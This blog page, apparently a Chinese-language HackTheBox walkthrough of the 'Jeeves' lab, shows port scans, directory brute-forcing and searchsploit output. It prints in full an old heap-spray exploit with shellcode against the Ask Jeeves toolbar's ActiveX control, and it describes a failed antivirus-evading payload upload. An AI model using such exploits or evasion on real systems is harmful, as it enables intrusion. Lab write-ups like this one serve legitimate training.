@@ -1,0 +1,709 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CrazyInSide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Recon:12345678Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 [sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-08-29 13:53:52 GMTInit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Jeeves">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Jeeves.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="Recon:12345678Crazy:~&#x2F;HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 [sudo] crazyinside 的密码：Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-08-29 13:53:52 GMTInit">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Jeeves.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829220118485.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829221344768.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223138811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223342514.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223415115.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829224837329.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230924982.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230958994.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231237892.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231408472.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.015Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.032Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Jeeves.png">
+  
+  
+  
+  <title>HTB Walkthrough - Jeeves - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Jeeves"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          124 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Jeeves</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Jeeves.png" srcset="/img/loading.gif" lazyload alt="Jeeves"></p>
+<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.63 </span><br><span class="line">[sudo] crazyinside 的密码：</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-08-29 13:53:52 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 445/tcp on 10.10.10.63                                    </span><br><span class="line">Discovered open port 80/tcp on 10.10.10.63                                     </span><br><span class="line">Discovered open port 135/tcp on 10.10.10.63   </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135</span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 21:57 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.63</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Ask Jeeves</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-08-29T18:57:15</span><br><span class="line">|_  start_date: 2022-08-29T18:53:39</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 47.97 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p445,80,135</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ curl -I http://10.10.10.63/                                                                                             </span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 503</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Last-Modified: Mon, 06 Nov 2017 02:34:40 GMT</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">ETag: <span class="string">&quot;2277f7cba756d31:0&quot;</span></span><br><span class="line">Server: Microsoft-IIS/10.0</span><br><span class="line">Date: Mon, 29 Aug 2022 18:57:31 GMT</span><br></pre></td></tr></table></figure>
+
+<p>假搜索框：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829220118485.png" srcset="/img/loading.gif" lazyload alt="image-20220829220118485"></p>
+<p>根本就不会像后端提交任何数据，而是无论输入什么都会跳转到一个错误信息的图片。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ dirsearch -u http://10.10.10.63 </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/crazyinside/.dirsearch/reports/10.10.10.63/_22-08-29_22-01-29.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-29_22-01-29.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.63/</span><br><span class="line"></span><br><span class="line">[22:01:29] Starting: </span><br><span class="line">[22:01:30] 403 -  312B  - /%2e%2e//google.com</span><br><span class="line">[22:01:56] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[22:02:39] 200 -   50B  - /error.html</span><br><span class="line">[22:02:50] 200 -  503B  - /index.html</span><br></pre></td></tr></table></figure>
+
+<p>但也没有一些目录信息。搜索漏洞会有一个溢出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ searchsploit Jeeves           </span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                       |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                          | windows/remote/4452.html</span><br><span class="line">----------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">Papers: No Results</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ <span class="built_in">cat</span> 4452.html </span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT language=<span class="string">&quot;javascript&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">// This is new technique I invent call <span class="string">&#x27;heap fill attack&#x27;</span></span><br><span class="line"></span><br><span class="line">var str0ke = 0x0d0d0d0d;</span><br><span class="line"></span><br><span class="line">var sucks = unescape( // Launch the system calculator 100 <span class="built_in">times</span> because what <span class="keyword">else</span>?</span><br><span class="line"></span><br><span class="line">                      // This code currently not work on Solaris/Sparc</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120&quot;</span> +</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424&quot;</span> +</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304&quot;</span> +</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0&quot;</span> +</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A&quot;</span> +</span><br><span class="line"></span><br><span class="line">        <span class="string">&quot;%uFF57%u63E7%u6C61%u0063&quot;</span>);</span><br><span class="line"></span><br><span class="line">var dick = 0x400000;</span><br><span class="line"></span><br><span class="line">var j0hnson = sucks.length * 2;</span><br><span class="line"></span><br><span class="line">var spraySlideSize = dick - (j0hnson+0x38);</span><br><span class="line"></span><br><span class="line">var spraySlide = unescape(<span class="string">&quot;%u9090%u9090&quot;</span>);</span><br><span class="line"></span><br><span class="line">spraySlide = getSpraySlide(spraySlide,spraySlideSize);</span><br><span class="line"></span><br><span class="line">heapBlocks = (str0ke - 0x400000)/dick;</span><br><span class="line"></span><br><span class="line">memory = new Array();<span class="keyword">for</span> (i=0;i&lt;heapBlocks;i++)</span><br><span class="line"></span><br><span class="line">&#123;memory[i] = spraySlide + sucks;&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line"></span><br><span class="line">gadi = new ActiveXObject( <span class="string">&#x27;AskJeevesToolBar.SettingsPlugin.1&#x27;</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch(evron)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">alert(evron);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">netdev = <span class="string">&quot;A&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (netdev.length != 0x5e0)</span><br><span class="line"></span><br><span class="line">netdev += <span class="string">&quot;A&quot;</span>;</span><br><span class="line"></span><br><span class="line">netdev += unescape(<span class="string">&quot;%0d%0d%0d%0d&quot;</span>);</span><br><span class="line"></span><br><span class="line">gadi.ShortFormat = netdev;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> getSpraySlide(spraySlide, spraySlideSize)</span><br><span class="line"></span><br><span class="line">        &#123;<span class="keyword">while</span> (spraySlide.length*2&lt;spraySlideSize)&#123;</span><br><span class="line"></span><br><span class="line">        spraySlide += spraySlide;&#125;</span><br><span class="line"></span><br><span class="line">        spraySlide = spraySlide.substring(0,spraySlideSize/2);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> spraySlide;&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># milw0rm.com [2007-09-24]                                                                                                                                       </span></span><br><span class="line">Crazy:~/HackTheBox$ </span><br></pre></td></tr></table></figure>
+
+<p>这看起来对我没什么用。我重新进行了端口扫描，因为masscan漏扫是常有的事：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p-    </span><br><span class="line">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 22:07 CST</span><br><span class="line">Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 27.49% <span class="keyword">done</span>; ETC: 22:12 (0:03:42 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> jeeves.htb (10.10.10.63)</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65531 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Ask Jeeves</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">50000/tcp open  http         Jetty 9.4.z-SNAPSHOT</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">|_http-title: Error 404 Not Found</span><br><span class="line">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-08-29T19:11:12</span><br><span class="line">|_  start_date: 2022-08-29T18:53:39</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 249.71 seconds</span><br><span class="line">zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p-</span><br></pre></td></tr></table></figure>
+
+<p>这不像是HTB内部的链接：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829221344768.png" srcset="/img/loading.gif" lazyload alt="image-20220829221344768"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Crazy:~/HackTheBox$ gobuster <span class="built_in">dir</span> -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,asp,aspx</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.10.63</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,php,asp,aspx</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/08/29 22:15:38 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 503]</span><br><span class="line">/askjeeves			  (Status: 302)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223138811.png" srcset="/img/loading.gif" lazyload alt="image-20220829223138811"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223342514.png" srcset="/img/loading.gif" lazyload alt="image-20220829223342514"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223415115.png" srcset="/img/loading.gif" lazyload alt="image-20220829223415115"></p>
+<p>有杀软的：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829224837329.png" srcset="/img/loading.gif" lazyload alt="image-20220829224837329"></p>
+<p>我选择用SMB给它传个免杀载荷：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230924982.png" srcset="/img/loading.gif" lazyload alt="image-20220829230924982"></p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230958994.png" srcset="/img/loading.gif" lazyload alt="image-20220829230958994"></p>
+<p>不知道什么原因失败了：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231237892.png" srcset="/img/loading.gif" lazyload alt="image-20220829231237892"></p>
+<p>看来得找时间去学习研究一下powershell 的免杀了：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231408472.png" srcset="/img/loading.gif" lazyload alt="image-20220829231408472"></p>
